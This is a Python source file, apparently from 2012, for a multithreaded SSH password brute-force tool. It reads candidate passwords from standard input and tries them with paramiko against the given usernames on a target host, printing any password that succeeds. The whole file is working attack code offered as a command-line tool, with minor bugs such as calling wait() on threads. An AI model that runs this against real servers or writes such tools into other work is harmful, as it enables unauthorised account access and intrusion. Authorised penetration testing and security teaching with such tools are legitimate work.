#!/usr/bin/env python
# $Id$

# Copyright (c) 2012, Daniel Bosk <daniel.bosk@miun.se>.
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without 
# modification, are permitted provided that the following conditions are met:
#
# *	Redistributions of source code must retain the above copyright notice, this 
#   list of conditions and the following disclaimer.
# *	Redistributions in binary form must reproduce the above copyright notice, 
# 	this list of conditions and the following disclaimer in the documentation 
# 	and/or other materials provided with the distribution.
# *	Neither the name of the author nor the names of other contributors may be 
#	used to endorse or promote products derived from this software without 
#	specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
# POSSIBILITY OF SUCH DAMAGE.

import argparse, sys, threading, string, Queue, paramiko, math, random

verbose = False

# function to connect to remote host and test a username and password
def ssh_try_passwd(host, port, user_list, passwd_queue):
	# we want to test the password for all supplied usernames
	for usr in user_list:
		# get a password from the queue
		pwd = passwd_queue.get()
		# create a ssh object to connect to the ssh server
		ssh = paramiko.Transport( (host, port) )

		try:
			# connect to the host
			ssh.start_client()
		except Exception as e:
			sys.stderr.write( str(e) )
			# if an error occurs we want to put the password back to the queue
			passwd_queue.put(pwd)
			passwd_queue.task_done()
			return None

		if ( verbose ):
			sys.stderr.write( "%s: %s\n" % (usr, pwd) )

		try:
			ssh.auth_password(username = usr, password = pwd)
		except paramiko.AuthenticationException as e:
			# wrong username and/or password
			continue
		except Exception as e:
			sys.stderr.write( str(e) )
			passwd_queue.put(pwd)
			return None
		finally:
			ssh.close()
			passwd_queue.task_done()

		return pwd

	return None


def ssh_bruteforce(host, port, user_list, passwd_queue):
	while ( not passwd_queue.empty() ):
		passwd = ssh_try_passwd( host, port, user_list, passwd_queue )
		if ( passwd != None ):
			sys.stdout.write("%s\n" % (passwd))
			return 0
	return -1


def main(argv):
	# create a parser for the command line
	argp = argparse.ArgumentParser( \
			description = "Bruteforce user and password combinations." )

	# add arguments
	argp.add_argument("-H", "--host", required = True, \
			help = "host to connect to.")
	argp.add_argument("-p", "--port", default = 22, \
			help = "remote port to connect to, default %(default)d.")
	argp.add_argument("-u", "--user", required = True, nargs = "+", \
			help = "username to brute force.")
	argp.add_argument("-t", "--threads", default = 4, type = int, \
			help = "number of threads to use for execution.")
	argp.add_argument("-q", "--qsize", default = 100, type = int, \
			help = "maximum queue size for password generator thread, " + \
			"default %(default)d.")
	argp.add_argument("-v", "--verbose", action = "store_true", \
			help = "enable verbose output to stderr.")

	# process the command line
	args = vars( argp.parse_args(argv[1:]) )

	host = args["host"]
	port = args["port"]
	user_list = args["user"]
	num_threads = args["threads"]
	threads = []
	queue_size = args["qsize"]
	passwd_queue = Queue.Queue( queue_size )
	global verbose
	verbose = args["verbose"]
	bruteforce_function = ssh_bruteforce
	passwd = ""

	# read password stream from stdin, i.e. keep running until eof
	i = 0
	while ( not sys.stdin.closed ):
		# if we have any threads, see if they are running or finished executing
		if ( len(threads) > 0 ):
			i = (i + 1) % len(threads)
			if ( not threads[i].is_alive() ):
				# thread was dead, remove it
				threads.pop(i)
				if ( verbose ):
					sys.stderr.write("removed bruteforce thread (%d)\n" % \
							( len(threads) ))
				# we want to remove all dead threads
				continue

		# if the queue is more than 50% full, start more processing threads
		if ( passwd_queue.qsize() > math.ceil( 0.50 * queue_size ) and \
				( len(threads) < num_threads or num_threads < 1 ) ):
			t = threading.Thread( target = bruteforce_function, \
					args = ( host, port, user_list, passwd_queue ) )
			t.start()
			threads.append(t)
			if ( verbose ):
				sys.stderr.write("started bruteforce thread (%d)\n" % \
						( len(threads) ))

		# read a line from stdin
		passwd += sys.stdin.readline()
		if ( passwd[-1] == "\n" ):
			# we read a full line, put it in the queue
			passwd_queue.put( passwd.rstrip("\n") )
			passwd = ""

	# stdin is closed, see if there are any bytes left in the buffer
	passwd += sys.stdin.readline()
	if ( passwd != "" ):
		# there was a password to process
		passwd_queue.put( passwd )

	# in case there are no threads running, start a thread to process the rest 
	# of the queue
	t = threading.Thread( target = bruteforce_function, \
			args = ( host, port, user_list, passwd_queue ) )
	t.start()
	threads.append(t)

	# wait for all remaining threads
	for t in threads:
		t.wait()

	if ( not passwd_queue.empty() ):
		sys.stderr.write("%s: password queue not empty\n" % ( sys.argv[0] ))
		return -1

	return 0


if __name__ == "__main__":
	sys.exit( main( sys.argv ) )
